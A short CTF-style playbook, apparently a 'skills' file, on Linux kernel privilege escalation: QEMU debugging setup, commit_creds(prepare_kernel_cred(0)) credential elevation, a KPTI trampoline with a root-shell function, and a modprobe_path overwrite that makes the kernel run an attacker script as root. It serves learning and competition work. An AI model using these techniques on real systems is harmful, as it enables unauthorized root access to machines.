# Kernel Exploitation Playbook (skills/pwn/kernel-pwn.md)

## 1. Environment & Debugging Setup

1. **Unpack `initramfs.cpio.gz`**:
   ```bash
   mkdir fs && cd fs
   gunzip -c ../initramfs.cpio.gz | cpio -idm
   ```

2. **Patch QEMU Startup Script**:
   - Change `kaslr` $\rightarrow$ `nokaslr` for local debugging.
   - Add `-gdb tcp::1234 -S` to attach GDB.

---

## 2. Core Kernel Exploitation Techniques

### 2.1 Credential Elevation (`commit_creds(prepare_kernel_cred(0))`)
- In older kernels (< 5.x) or when KASLR is defeated:
```c
commit_creds(prepare_kernel_cred(0));
```

### 2.2 Modern KROP & KPTI Trampoline
To safely return from kernel space to user space under KPTI:
```c
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_user_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void get_shell() {
    if (getuid() == 0) {
        system("/bin/sh");
    }
}
```

ROP Chain:
1. `commit_creds(prepare_kernel_cred(NULL))`
2. `swapgs_restore_regs_and_return_to_usermode` gadget (KPTI trampoline)
3. Return to `get_shell` in user mode with saved `user_cs`, `user_rflags`, `user_sp`, `user_ss`.

### 2.3 `modprobe_path` Overwrite
If arbitrary write primitive exists:
1. Overwrite `modprobe_path` with `/tmp/x`.
2. Create `/tmp/x` executable: `#!/bin/sh\nchmod 777 /flag\n`.
3. Create dummy file with unknown header `\xff\xff\xff\xff` and execute it.
4. Kernel executes `/tmp/x` as root!
